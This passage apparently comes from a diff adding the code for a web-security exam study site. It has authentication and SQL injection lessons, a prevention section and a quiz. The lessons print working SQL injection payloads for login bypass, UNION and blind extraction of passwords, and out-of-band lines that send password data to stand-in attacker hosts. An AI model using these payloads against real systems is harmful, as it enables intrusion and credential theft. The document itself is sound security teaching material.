+        <tr><td>Sessions</td><td class="td-green">Regenerated post-login, short TTL</td><td class="td-red">Fixed session ID, no expiry</td></tr>
+      </table>
+
+      <div class="info-box tip">
+        <div class="box-icon">💡</div>
+        <div class="box-body">
+          <div class="box-title">Best Practice</div>
+          Follow NIST SP 800-63B Digital Identity Guidelines for password policy. Avoid mandatory periodic password rotation (it encourages weak patterns) — focus on breach detection instead.
+        </div>
+      </div>
+    `
+  }
+];
+
+const sqliTopics = [
+  {
+    id: 'sqli-what',
+    title: 'What is SQL Injection?',
+    badge: 'low',
+    badgeText: 'Foundational',
+    content: `
+      <h3>Definition</h3>
+      <p><em>SQL Injection (SQLi)</em> is a web security vulnerability that allows attackers to interfere with SQL queries made by an application to its database. It occurs when user-supplied data is incorporated into queries without proper sanitization.</p>
+
+      <h3>Impact of SQL Injection</h3>
+      <ul>
+        <li><strong>Data exfiltration</strong> — Read sensitive data (passwords, PII, credit cards)</li>
+        <li><strong>Authentication bypass</strong> — Log in without valid credentials</li>
+        <li><strong>Data modification</strong> — Insert, update, or delete database records</li>
+        <li><strong>Data destruction</strong> — DROP tables, truncate data</li>
+        <li><strong>OS command execution</strong> — Via xp_cmdshell (MSSQL), UDFs</li>
+        <li><strong>Network pivoting</strong> — OAST techniques to reach internal systems</li>
+        <li><strong>Denial of service</strong> — Resource exhaustion via heavy queries</li>
+      </ul>
+
+      <h3>How SQL Injection Works</h3>
+      <div class="code-block cyan">-- Normal query (application code):
+SELECT * FROM products WHERE category = 'Electronics'
+
+-- With user input injected (category = "Electronics' OR '1'='1"):
+SELECT * FROM products WHERE category = 'Electronics' OR '1'='1'
+-- Returns ALL products (1=1 is always true)</div>
+
+      <h3>Detection Methods</h3>
+      <ul>
+        <li>Submit single quote <code>'</code> — look for database errors</li>
+        <li>Submit SQL-specific syntax that evaluates to original value</li>
+        <li>Submit boolean conditions: <code>OR 1=1</code> vs <code>OR 1=2</code></li>
+        <li>Submit time-delay payloads: <code>SLEEP(5)</code></li>
+        <li>Submit OAST payloads triggering DNS/HTTP requests</li>
+      </ul>
+
+      <div class="info-box info">
+        <div class="box-icon">ℹ️</div>
+        <div class="box-body">
+          <div class="box-title">Where to Test</div>
+          SQL injection can occur in: GET/POST parameters, URL path components, HTTP headers (User-Agent, Cookie, Referer, X-Forwarded-For), JSON/XML body data, search functions, login forms, order-by clauses.
+        </div>
+      </div>
+
+      <div class="tag-row">
+        <span class="tag cyan">OWASP A03</span>
+        <span class="tag red">Critical Severity</span>
+        <span class="tag green">Most Tested</span>
+        <span class="tag purple">CWE-89</span>
+      </div>
+    `
+  },
+  {
+    id: 'sqli-hidden',
+    title: 'Retrieving Hidden Data',
+    badge: 'high',
+    badgeText: 'High Priority',
+    content: `
+      <h3>Scenario</h3>
+      <p>Applications often use SQL to filter data — e.g., showing only published products. SQLi can remove these filters and expose hidden records.</p>
+
+      <h3>Example Application Query</h3>
+      <div class="code-block cyan">-- Normal: Shows only released products
+SELECT * FROM products 
+WHERE category = 'Gifts' AND released = 1
+
+-- URL: /products?category=Gifts</div>
+
+      <h3>Attack: Removing WHERE clause conditions</h3>
+      <div class="code-block red">-- URL: /products?category=Gifts'--
+-- Results in:
+SELECT * FROM products 
+WHERE category = 'Gifts'--' AND released = 1
+-- (everything after -- is a comment → released filter removed)
+
+-- URL: /products?category=Gifts'+OR+1=1--
+-- Results in:
+SELECT * FROM products 
+WHERE category = 'Gifts' OR 1=1--
+-- Returns ALL products from ALL categories</div>
+
+      <h3>SQL Comment Syntax by Database</h3>
+      <table class="comp-table">
+        <tr><th>Database</th><th>Comment Syntax</th></tr>
+        <tr><td>MySQL</td><td><code class="td-cyan">-- comment</code> or <code class="td-cyan"># comment</code></td></tr>
+        <tr><td>PostgreSQL</td><td><code class="td-cyan">-- comment</code></td></tr>
+        <tr><td>MSSQL</td><td><code class="td-cyan">-- comment</code></td></tr>
+        <tr><td>Oracle</td><td><code class="td-cyan">-- comment</code></td></tr>
+        <tr><td>SQLite</td><td><code class="td-cyan">-- comment</code></td></tr>
+      </table>
+
+      <h3>Subverting Application Logic (Login Bypass)</h3>
+      <div class="code-block red">-- Application query:
+SELECT * FROM users 
+WHERE username = 'admin' AND password = 'password'
+
+-- Injecting into username field:
+Username: admin'--
+Password: (anything)
+
+-- Resulting query:
+SELECT * FROM users 
+WHERE username = 'admin'--' AND password = 'anything'
+-- Password check is commented out → login succeeds!</div>
+
+      <div class="info-box exam">
+        <div class="box-icon">🎓</div>
+        <div class="box-body">
+          <div class="box-title">Must Remember</div>
+          Always try both <code>--</code> and <code>-- -</code> (with space) and <code>#</code> for MySQL. In URL parameters, a space before -- may be needed: <code>-- -</code>. The double dash must often be followed by a space to be recognized as a comment.
+        </div>
+      </div>
+
+      <h3>Common Payloads</h3>
+      <div class="payload-grid">
+        <div class="payload-item">' OR 1=1--</div>
+        <div class="payload-item">' OR '1'='1</div>
+        <div class="payload-item">admin'--</div>
+        <div class="payload-item">admin'/*</div>
+        <div class="payload-item">' OR 1=1#</div>
+        <div class="payload-item">') OR ('1'='1</div>
+        <div class="payload-item">1' OR '1'='1'--</div>
+        <div class="payload-item">') OR 1=1--</div>
+      </div>
+    `
+  },
+  {
+    id: 'sqli-union',
+    title: 'UNION Attacks — Extracting Data',
+    badge: 'high',
+    badgeText: 'High Priority',
+    content: `
+      <h3>What is a UNION Attack?</h3>
+      <p>The SQL <code>UNION</code> operator combines results from multiple <code>SELECT</code> statements. SQLi UNION attacks append additional queries to retrieve data from other tables.</p>
+
+      <h3>Requirements for UNION Attack</h3>
+      <ul>
+        <li>Individual queries must return the <strong>same number of columns</strong></li>
+        <li>Data types must be <strong>compatible</strong> across queries</li>
+        <li>At least one column must display <strong>string data</strong></li>
+      </ul>
+
+      <h3>Step 1: Determine Number of Columns</h3>
+      <p>Method 1 — <code>ORDER BY</code> (increment until error):</p>
+      <div class="code-block cyan">-- Try incrementally:
+' ORDER BY 1--   ✓ (no error)
+' ORDER BY 2--   ✓ (no error)
+' ORDER BY 3--   ✓ (no error)
+' ORDER BY 4--   ✗ (error! = 3 columns)</div>
+
+      <p>Method 2 — <code>UNION SELECT NULL</code>:</p>
+      <div class="code-block cyan">-- Add NULLs until no error:
+' UNION SELECT NULL--          ✗
+' UNION SELECT NULL,NULL--     ✗
+' UNION SELECT NULL,NULL,NULL-- ✓ (3 columns!)</div>
+
+      <h3>Step 2: Find Columns with String Type</h3>
+      <div class="code-block cyan">-- Replace NULL with 'a' to find string-compatible columns:
+' UNION SELECT 'a',NULL,NULL--   ← test col 1
+' UNION SELECT NULL,'a',NULL--   ← test col 2
+' UNION SELECT NULL,NULL,'a'--   ← test col 3</div>
+
+      <h3>Step 3: Retrieve Interesting Data</h3>
+      <div class="code-block cyan">-- Get usernames and passwords:
+' UNION SELECT username,password,NULL FROM users--
+
+-- Concatenate two values in one column:
+' UNION SELECT username||':'||password,NULL,NULL FROM users-- (Oracle)
+' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users-- (MySQL)</div>
+
+      <h3>Retrieve Multiple Values in Single Column</h3>
+      <div class="code-block cyan">-- Using string concatenation:
+' UNION SELECT NULL,username||'~'||password FROM users-- (PostgreSQL/Oracle)
+' UNION SELECT NULL,username+'~'+password FROM users-- (MSSQL)
+' UNION SELECT NULL,CONCAT(username,'~',password) FROM users-- (MySQL)</div>
+
+      <h3>UNION vs Boolean SQLi Comparison</h3>
+      <table class="comp-table">
+        <tr><th>Aspect</th><th>UNION Attack</th><th>Boolean Blind</th></tr>
+        <tr><td>Speed</td><td class="td-green">Fast (direct output)</td><td class="td-red">Slow (1 bit at a time)</td></tr>
+        <tr><td>Requirement</td><td>Visible output column</td><td>Behavioral difference</td></tr>
+        <tr><td>Data retrieval</td><td>Bulk extraction</td><td>Character by character</td></tr>
+        <tr><td>Error-based</td><td>Not required</td><td>Not required</td></tr>
+        <tr><td>Difficulty</td><td class="td-green">Moderate</td><td class="td-red">Higher</td></tr>
+      </table>
+
+      <div class="info-box exam">
+        <div class="box-icon">🎓</div>
+        <div class="box-body">
+          <div class="box-title">Exam Tips</div>
+          Oracle requires <code>FROM dual</code> in SELECT: <code>' UNION SELECT NULL FROM DUAL--</code>. Always use NULL first (avoids type mismatch errors), then replace with test strings. Remember: column count and types must match the original query.
+        </div>
+      </div>
+    `
+  },
+  {
+    id: 'sqli-db-enum',
+    title: 'Examining the Database',
+    badge: 'high',
+    badgeText: 'High Priority',
+    content: `
+      <h3>Database Fingerprinting</h3>
+      <p>Determining the database type and version is crucial for crafting appropriate payloads.</p>
+
+      <h3>Version Queries by Database</h3>
+      <table class="comp-table">
+        <tr><th>Database</th><th>Version Query</th><th>String Concat</th></tr>
+        <tr><td>MySQL</td><td><code class="td-cyan">SELECT @@version</code></td><td><code>CONCAT(a,b)</code></td></tr>
+        <tr><td>PostgreSQL</td><td><code class="td-cyan">SELECT version()</code></td><td><code>a||b</code></td></tr>
+        <tr><td>MSSQL</td><td><code class="td-cyan">SELECT @@version</code></td><td><code>a+b</code></td></tr>
+        <tr><td>Oracle</td><td><code class="td-cyan">SELECT banner FROM v$version</code></td><td><code>a||b</code></td></tr>
+      </table>
+
+      <h3>Listing Tables (Non-Oracle)</h3>
+      <div class="code-block cyan">-- information_schema (MySQL, PostgreSQL, MSSQL):
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+
+-- Filter to interesting tables:
+' UNION SELECT table_name,NULL FROM information_schema.tables 
+  WHERE table_schema = 'public'--</div>
+
+      <h3>Listing Columns</h3>
+      <div class="code-block cyan">-- Get columns of target table:
+' UNION SELECT column_name,NULL FROM information_schema.columns 
+  WHERE table_name='users'--
+
+-- Oracle equivalent:
+' UNION SELECT column_name,NULL FROM all_tab_columns 
+  WHERE table_name='USERS'--</div>
+
+      <h3>Oracle-Specific</h3>
+      <div class="code-block cyan">-- Oracle: list tables
+' UNION SELECT table_name,NULL FROM all_tables--
+
+-- Oracle: list columns
+' UNION SELECT column_name,NULL FROM all_tab_columns 
+  WHERE table_name='USERS'--
+
+-- Always need FROM in Oracle SELECT:
+' UNION SELECT NULL,NULL FROM DUAL--</div>
+
+      <h3>Common Interesting Tables</h3>
+      <div class="tag-row">
+        <span class="tag cyan">users</span>
+        <span class="tag cyan">accounts</span>
+        <span class="tag cyan">admin</span>
+        <span class="tag cyan">employees</span>
+        <span class="tag cyan">credentials</span>
+        <span class="tag cyan">sessions</span>
+        <span class="tag cyan">tokens</span>
+      </div>
+
+      <div class="info-box exam">
+        <div class="box-icon">🎓</div>
+        <div class="box-body">
+          <div class="box-title">Exam Tips</div>
+          The <code>information_schema</code> approach works for MySQL, PostgreSQL, and MSSQL. Oracle uses <code>all_tables</code> and <code>all_tab_columns</code>. Always check table_schema to filter to the correct database.
+        </div>
+      </div>
+    `
+  },
+  {
+    id: 'sqli-blind',
+    title: 'Blind SQL Injection',
+    badge: 'high',
+    badgeText: 'High Priority',
+    content: `
+      <h3>What is Blind SQL Injection?</h3>
+      <p><em>Blind SQLi</em> occurs when the application doesn't return query results or database errors in its response. The attacker must infer information indirectly through observable side effects.</p>
+
+      <h3>Types of Blind SQLi</h3>
+      <table class="comp-table">
+        <tr><th>Type</th><th>Signal</th><th>Speed</th><th>Requirement</th></tr>
+        <tr><td class="td-green">Boolean-based</td><td>Behavioral difference (content/status)</td><td>Slow</td><td>True/false response difference</td></tr>
+        <tr><td class="td-orange">Error-based</td><td>Database error message</td><td>Medium</td><td>Errors exposed to user</td></tr>
+        <tr><td class="td-cyan">Time-based</td><td>Response delay</td><td>Very slow</td><td>Works even with no visible output</td></tr>
+        <tr><td class="td-purple">OAST</td><td>Out-of-band DNS/HTTP request</td><td>Fast</td><td>DB can make outbound connections</td></tr>
+      </table>
+
+      <h3>Boolean-Based Blind SQLi</h3>
+      <div class="code-block cyan">-- Application returns different content for true/false conditions:
+
+-- True condition (normal response):
+' AND 1=1--
+
+-- False condition (different/empty response):
+' AND 1=2--
+
+-- Extracting data character by character:
+' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
+' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='b'--
+-- (repeat until character found, then move to position 2)
+
+-- More efficient with ASCII:
+' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>64--</div>
+
+      <h3>Error-Based SQL Injection</h3>
+      <p>Trigger database errors that include actual data in the error message:</p>
+      <div class="code-block red">-- Oracle error extraction:
+' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS int)--
+-- Error: invalid input syntax for type integer: "s3cr3t_pass"
+-- (reveals the password in the error!)
+
+-- MSSQL:
+' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--
+
+-- MySQL (conditional):
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)))--</div>
+
+      <h3>Time-Based Blind SQLi</h3>
+      <div class="code-block cyan">-- MySQL:
+' AND IF(1=1,SLEEP(5),0)--
+' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)--
+
+-- PostgreSQL:
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+
+-- MSSQL:
+'; IF (1=1) WAITFOR DELAY '0:0:5'--
+
+-- Oracle (heavy query as delay):
+' AND 1=1 AND ROWNUM &lt; 2 (complex subquery causing delay)</div>
+
+      <h3>OAST (Out-of-Band) Techniques</h3>
+      <p>Trigger DNS or HTTP requests to an attacker-controlled server:</p>
+      <div class="code-block cyan">-- MSSQL: DNS lookup via xp_dirtree
+'; exec master..xp_dirtree '//attacker-burpcollaborator.net/x'--
+
+-- MySQL:
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\x'))--
+
+-- Oracle: HTTP request
+' UNION SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='admin')||'.attacker.com/"&gt; %remote;]&gt;'),'/l') FROM dual--</div>
+
+      <h3>Second-Order SQL Injection</h3>
+      <p>The payload is stored safely (first order), but later retrieved and incorporated into a query unsafely (second order). Parameterized queries at storage don't protect if retrieval is unsafe.</p>
+      <div class="code-block red">-- Step 1: Register username: admin'--
+-- Stored safely with parameterized query
+
+-- Step 2: Application later uses stored username in:
+UPDATE users SET password='new' WHERE username='admin'--'
+-- The ' character breaks out → modifies admin's password!</div>
+
+      <div class="info-box exam">
+        <div class="box-icon">🎓</div>
+        <div class="box-body">
+          <div class="box-title">Must Remember</div>
+          For blind SQLi: Boolean = behavioral difference | Time-based = response delay | OAST = out-of-band channel. Burp Collaborator is essential for OAST. sqlmap can automate blind extraction but understand manual techniques for exams.
+        </div>
+      </div>
+    `
+  },
+  {
+    id: 'sqli-prevention',
+    title: 'How to Prevent SQL Injection',
+    badge: 'low',
+    badgeText: 'Defense',
+    content: `
+      <h3>Primary Defense: Parameterized Queries</h3>
+      <p>Also called <em>prepared statements</em> — the SQL structure is defined separately from user-supplied data. The database treats user data as pure data, never as SQL syntax.</p>
+
+      <h3>Secure Code Examples</h3>
+      <div class="code-block cyan">-- VULNERABLE (string concatenation):
+String query = "SELECT * FROM users WHERE username = '" + username + "'";
+
+-- SECURE (parameterized - Java):
+PreparedStatement stmt = conn.prepareStatement(
+    "SELECT * FROM users WHERE username = ?");
+stmt.setString(1, username);
+
+-- SECURE (parameterized - Python):
+cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
+
+-- SECURE (parameterized - PHP PDO):
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
+$stmt->execute([$username]);
+
+-- SECURE (parameterized - Node.js):
+db.query("SELECT * FROM users WHERE username = $1", [username]);</div>
+
+      <h3>Defense Layers</h3>
+      <table class="comp-table">
+        <tr><th>Defense</th><th>Effectiveness</th><th>Notes</th></tr>
+        <tr><td>Parameterized queries</td><td class="td-green">Primary (highest)</td><td>Eliminates injection at root</td></tr>
+        <tr><td>Stored procedures</td><td class="td-green">High (if parameterized)</td><td>Still vulnerable if dynamic SQL inside</td></tr>
+        <tr><td>Input validation (allowlist)</td><td class="td-orange">Supplementary</td><td>Not sufficient alone — context-dependent</td></tr>
+        <tr><td>Escaping user input</td><td class="td-orange">Supplementary</td><td>Error-prone, context-specific</td></tr>
+        <tr><td>WAF</td><td class="td-cyan">Supplementary</td><td>Bypassable — defense-in-depth only</td></tr>
+        <tr><td>Least privilege DB accounts</td><td class="td-green">Damage limitation</td><td>Limits impact of successful SQLi</td></tr>
+        <tr><td>Error suppression</td><td class="td-cyan">Reduces information leakage</td><td>Blind SQLi still possible</td></tr>
+      </table>
+
+      <h3>ORM Usage</h3>
+      <p>Modern ORMs (Hibernate, Django ORM, SQLAlchemy, ActiveRecord) use parameterized queries by default. However:</p>
+      <ul>
+        <li>Raw SQL methods (<code>raw()</code>, <code>execute()</code>) bypass ORM protections</li>
+        <li>Dynamic table/column names still require careful handling</li>
+        <li>Never trust ORM = immune — review any native query usage</li>
+      </ul>
+
+      <h3>Database-Level Controls</h3>
+      <ul>
+        <li>Run application with minimum required DB privileges</li>
+        <li>Separate read and write accounts where possible</li>
+        <li>Disable dangerous features (xp_cmdshell in MSSQL, LOAD FILE in MySQL)</li>
+        <li>Enable DB query logging and anomaly detection</li>
+        <li>Network-isolate the database server</li>
+      </ul>
+
+      <div class="info-box warning">
+        <div class="box-icon">⚠️</div>
+        <div class="box-body">
+          <div class="box-title">Common Mistake</div>
+          Many developers use parameterized queries for WHERE clauses but forget to parameterize ORDER BY and table/column names (which can't be parameterized). For dynamic identifiers, use a strict allowlist — never concatenate user input for these.
+        </div>
+      </div>
+
+      <div class="info-box exam">
+        <div class="box-icon">🎓</div>
+        <div class="box-body">
+          <div class="box-title">Exam Tips</div>
+          The correct answer for "how to prevent SQLi" is ALWAYS parameterized queries / prepared statements — not input sanitization, not escaping, not WAF. These are secondary controls. Parameterized queries eliminate the vulnerability at the source.
+        </div>
+      </div>
+    `
+  },
+  {
+    id: 'sqli-cheatsheet',
+    title: 'SQL Injection Cheat Sheet',
+    badge: 'high',
+    badgeText: 'Reference',
+    content: `
+      <h3>String Concatenation by Database</h3>
+      <table class="comp-table">
+        <tr><th>Database</th><th>Syntax</th></tr>
+        <tr><td>Oracle</td><td><code class="td-cyan">'foo'||'bar'</code></td></tr>
+        <tr><td>MSSQL</td><td><code class="td-cyan">'foo'+'bar'</code></td></tr>
+        <tr><td>PostgreSQL</td><td><code class="td-cyan">'foo'||'bar'</code></td></tr>
+        <tr><td>MySQL</td><td><code class="td-cyan">CONCAT('foo','bar')</code></td></tr>
+      </table>
+
+      <h3>Substring Extraction</h3>
+      <table class="comp-table">
+        <tr><th>Database</th><th>Syntax</th></tr>
+        <tr><td>Oracle</td><td><code class="td-cyan">SUBSTR('foobar',4,2)</code></td></tr>
+        <tr><td>MSSQL</td><td><code class="td-cyan">SUBSTRING('foobar',4,2)</code></td></tr>
+        <tr><td>PostgreSQL</td><td><code class="td-cyan">SUBSTRING('foobar',4,2)</code></td></tr>
+        <tr><td>MySQL</td><td><code class="td-cyan">SUBSTRING('foobar',4,2)</code></td></tr>
+      </table>
+
+      <h3>Time Delays</h3>
+      <table class="comp-table">
+        <tr><th>Database</th><th>Syntax</th></tr>
+        <tr><td>Oracle</td><td><code class="td-cyan">dbms_pipe.receive_message(('a'),10)</code></td></tr>
+        <tr><td>MSSQL</td><td><code class="td-cyan">WAITFOR DELAY '0:0:10'</code></td></tr>
+        <tr><td>PostgreSQL</td><td><code class="td-cyan">SELECT pg_sleep(10)</code></td></tr>
+        <tr><td>MySQL</td><td><code class="td-cyan">SELECT SLEEP(10)</code></td></tr>
+      </table>
+
+      <h3>DNS Lookups (OAST)</h3>
+      <div class="code-block cyan">-- Oracle
+SELECT EXTRACTVALUE(xmltype('&lt;?xml...&gt;&lt;!ENTITY % remote SYSTEM "http://BURP-COLLAB/"&gt;...'),'/l') FROM dual
+
+-- MSSQL
+exec master..xp_dirtree '//BURP-COLLAB/a'
+
+-- PostgreSQL
+COPY (SELECT '') TO PROGRAM 'nslookup BURP-COLLAB'
+
+-- MySQL (requires FILE privilege)
+LOAD_FILE(CONCAT('\\\\',(SELECT password),'BURP-COLLAB\\x'))</div>
+
+      <h3>Conditional Errors</h3>
+      <div class="code-block red">-- Oracle
+SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM dual
+
+-- MSSQL
+SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END
+
+-- PostgreSQL
+1 = (SELECT CASE WHEN (1=1) THEN CAST(1/0 AS INTEGER) ELSE NULL END)
+
+-- MySQL
+SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),'a')</div>
+
+      <h3>Batch Queries (Stacked)</h3>
+      <div class="info-box info">
+        <div class="box-icon">ℹ️</div>
+        <div class="box-body">
+          <div class="box-title">Stacked Queries</div>
+          <strong>MSSQL & PostgreSQL:</strong> <code>; SELECT 1--</code><br>
+          <strong>MySQL:</strong> Supported in some contexts<br>
+          <strong>Oracle:</strong> Not supported<br>
+          Stacked queries allow executing additional SQL statements but depend on how the app processes multiple results.
+        </div>
+      </div>
+
+      <h3>URL Encoding for Special Characters</h3>
+      <div class="code-block">%27 = '    (single quote)
+%22 = "    (double quote)
+%20 = space
+%2B = +    (plus, needed for URL params)
+%23 = #    (hash comment)
+%2D%2D = -- (double dash comment)
+%3B = ;    (semicolon)
+%00 = NULL byte (truncation in some contexts)</div>
+
+      <div class="info-box exam">
+        <div class="box-icon">🎓</div>
+        <div class="box-body">
+          <div class="box-title">Quick Methodology</div>
+          1. Detect → 2. Fingerprint DB → 3. Determine columns (ORDER BY) → 4. Find string columns (UNION NULL tests) → 5. Extract schema (information_schema) → 6. Extract data (UNION SELECT) → 7. If blind: boolean/time/OAST
+        </div>
+      </div>
+    `
+  }
+];
+
+/* ============================================================
+   QUIZ QUESTIONS
+   ============================================================ */
+const quizQuestions = [
+  { q: "What is the primary purpose of authentication?", opts: ["Granting permissions to resources","Verifying the identity of a user or entity","Encrypting data in transit","Auditing user actions"], ans: 1, exp: "Authentication verifies WHO you are. Authorization (not authentication) controls what you can do." },
+  { q: "Which HTTP header can be abused in password reset attacks to redirect reset tokens to an attacker?", opts: ["Content-Type","Authorization","Host","Accept"], ans: 2, exp: "The Host header is used by many applications to construct reset links. Attackers can modify it to redirect tokens to their server." },
+  { q: "A login page returns 'Invalid username' for non-existent users and 'Incorrect password' for valid ones. What vulnerability is this?", opts: ["Brute force","Username enumeration","Session fixation","CSRF"], ans: 1, exp: "Different error messages allow attackers to enumerate valid usernames, forming the basis for targeted attacks." },
+  { q: "What is the missing control that enables CSRF attacks on OAuth flows?", opts: ["Missing client_id","Missing redirect_uri","Missing state parameter","Missing scope parameter"], ans: 2, exp: "The state parameter carries a CSRF token that prevents attackers from forging authorization callbacks." },
+  { q: "Which password hashing algorithm is recommended for storing passwords securely?", opts: ["MD5","SHA-1","SHA-256","bcrypt or Argon2"], ans: 3, exp: "bcrypt and Argon2 are specifically designed for password hashing — they are intentionally slow and include built-in salting." },
+  { q: "A 'remember me' cookie contains the Base64-encoded value of 'admin:password123'. What vulnerability is present?", opts: ["SQL Injection","Insecure Direct Object Reference","Predictable/reversible persistent token","Cross-Site Scripting"], ans: 2, exp: "The token encodes credentials in a reversible format. An attacker can decode it, modify the username, and forge tokens for other accounts." },
+  { q: "How can an attacker bypass a two-factor authentication step?", opts: ["By submitting SQL injection in the OTP field","By navigating directly to the post-login page after completing step 1","By modifying the Content-Type header","By clearing browser cookies"], ans: 1, exp: "If the session is partially established after step 1, directly navigating to authenticated pages may bypass the 2FA check entirely." },
+  { q: "What does SQL injection payload ' OR 1=1-- achieve in a login query?", opts: ["Drops the users table","Returns all records by making WHERE clause always true","Encrypts the password field","Creates a new admin user"], ans: 1, exp: "OR 1=1 makes the WHERE condition always true. The -- comments out the rest (including password check), returning all records." },
+  { q: "In a UNION-based SQL injection, what must be true about the injected SELECT statement?", opts: ["It must return more columns than the original","It must return the same number of columns as the original query","It must use a different database","It must execute as a subquery"], ans: 1, exp: "UNION requires both SELECT statements to return the same number of columns with compatible data types." },
+  { q: "What SQL comment syntax is used in MySQL that is NOT standard SQL?", opts: ["--","/* */","#","Both -- and #"], ans: 3, exp: "The # symbol is a MySQL-specific comment syntax. Standard SQL uses --. Both work in MySQL, but only -- is standard." },
+  { q: "Which technique is used when SQL injection shows no output and no errors, only a time delay?", opts: ["UNION attack","Error-based SQLi","Time-based blind SQLi","Second-order SQLi"], ans: 2, exp: "Time-based blind SQLi uses conditional time delays (SLEEP, WAITFOR DELAY) to infer true/false conditions when no visible output exists." },
+  { q: "What is second-order SQL injection?", opts: ["SQLi in the second URL parameter","Payload stored safely then executed unsafely later","Two consecutive SQL injections","SQLi requiring two different tables"], ans: 1, exp: "Second-order SQLi stores the payload safely but the application later incorporates stored data into a query without parameterization." },
+  { q: "Which SQL clause is used to determine the number of columns in UNION-based SQLi?", opts: ["GROUP BY","HAVING","ORDER BY","LIMIT"], ans: 2, exp: "ORDER BY [number] increments until an error occurs, revealing the column count. At error: columns = last successful number." },
+  { q: "What is the BEST prevention for SQL injection?", opts: ["Input validation and sanitization","Web Application Firewall (WAF)","Parameterized queries (prepared statements)","Escaping special characters"], ans: 2, exp: "Parameterized queries separate SQL structure from data, making injection impossible regardless of input content." },
+  { q: "In OAST-based SQL injection, what is the attacker trying to trigger?", opts: ["An error message containing data","A time delay in the response","An out-of-band network request (DNS/HTTP)","A redirect to another page"], ans: 2, exp: "OAST (Out-of-band Application Security Testing) triggers DNS or HTTP requests to an attacker-controlled server, exfiltrating data even when no visible output exists." },
+  { q: "Which OAuth grant type is considered least secure for web applications?", opts: ["Authorization Code","Client Credentials","Implicit","Device Code"], ans: 2, exp: "The Implicit grant type returns the access token directly in the URL fragment, exposing it in browser history, logs, and Referer headers." },
+  { q: "What does the HttpOnly flag on a cookie prevent?", opts: ["Sending the cookie over HTTP","JavaScript from accessing the cookie","The cookie from being sent cross-origin","CSRF attacks"], ans: 1, exp: "HttpOnly prevents JavaScript (including XSS payloads) from accessing the cookie value via document.cookie." },
+  { q: "When testing for blind boolean SQL injection, what do you observe?", opts: ["Database error messages","Different SQL syntax in responses","Observable behavioral differences between true/false conditions","Network time delays"], ans: 2, exp: "Boolean blind SQLi requires two conditions: one true (normal response) and one false (different response), allowing binary inference of data." },
+  { q: "What Oracle-specific syntax is required in UNION SELECT statements?", opts: ["ROWNUM","FROM DUAL","CONNECT BY","ROWID"], ans: 1, exp: "Oracle requires a FROM clause in every SELECT statement. FROM DUAL provides a dummy table for UNION queries that don't need to select from real tables." },
+  { q: "Which information_schema table lists all tables in a database (MySQL/PostgreSQL)?", opts: ["information_schema.columns","information_schema.databases","information_schema.tables","information_schema.schemata"], ans: 2, exp: "information_schema.tables contains metadata about all tables across all databases, filterable by table_schema for a specific database." },
+  { q: "What is password spraying?", opts: ["Hashing passwords with salt","Testing one common password against many accounts","Testing many passwords against one account","Encrypting password databases"], ans: 1, exp: "Password spraying uses one (or a few) common passwords across many accounts, avoiding per-account lockout thresholds." },
+  { q: "A reset token appears in the URL as /reset?token=abc123. What is the risk?", opts: ["CSRF vulnerability","Token exposed in server logs, browser history, and Referer headers","SQL injection in token parameter","XSS vulnerability"], ans: 1, exp: "URL parameters are logged by web servers, proxies, and browser history, and leaked via Referer headers — making tokens in URLs a significant exposure risk." }
+];
+
+/* ============================================================
+   QUIZ STATE
+   ============================================================ */
+let quizState = {
+  active: false,
+  current: 0,
+  score: 0,
+  answered: false,
+  questions: [],
+  bestScore: null
+};
+
+/* ============================================================
+   PROGRESS STATE
+   ============================================================ */
+let studiedTopics = new Set(JSON.parse(localStorage.getItem('wsh_studied') || '[]'));
+let bestQuizScore = localStorage.getItem('wsh_quiz_best');
+if (bestQuizScore) quizState.bestScore = parseInt(bestQuizScore);
+
+/* ============================================================
+   RENDER TOPICS
+   ============================================================ */
+function renderTopics(topics, containerId, section) {
+  const container = document.getElementById(containerId);
+  topics.forEach((topic, idx) => {
+    const card = document.createElement('div');
+    card.className = 'topic-card' + (studiedTopics.has(topic.id) ? ' studied' : '');
+    card.id = 'card-' + topic.id;
+    card.innerHTML = `
+      <div class="topic-header" onclick="toggleTopic('${topic.id}')">
+        <span class="topic-num">${String(idx + 1).padStart(2, '0')}</span>
+        <span class="topic-title">${topic.title}</span>
+        <span class="topic-badge ${topic.badge}">${topic.badgeText}</span>
+        <button class="topic-studied-btn" onclick="toggleStudied(event,'${topic.id}')" title="Mark as studied">✓</button>
+        <span class="topic-chevron">▼</span>
+      </div>
+      <div class="topic-body" id="body-${topic.id}">
+        <div class="topic-content">${topic.content}</div>
+      </div>
+    `;
+    container.appendChild(card);
+  });
+}
+
+function toggleTopic(id) {
+  const card = document.getElementById('card-' + id);
+  card.classList.toggle('open');
+}
+
+function toggleStudied(e, id) {
+  e.stopPropagation();
+  const card = document.getElementById('card-' + id);
+  if (studiedTopics.has(id)) {
+    studiedTopics.delete(id);
+    card.classList.remove('studied');
+  } else {
+    studiedTopics.add(id);
+    card.classList.add('studied');
+  }
+  localStorage.setItem('wsh_studied', JSON.stringify([...studiedTopics]));
+  updateProgress();
+  updateSidebarStudied();
+}
+
+/* ============================================================
+   SIDEBAR NAV
+   ============================================================ */
+function buildSidebarNav() {
+  const nav = document.getElementById('sidebarNav');
+  nav.innerHTML = '';
+
+  // Auth section
+  const authHeader = document.createElement('div');
+  authHeader.className = 'nav-section-header';
+  authHeader.textContent = 'Authentication';
+  nav.appendChild(authHeader);
+
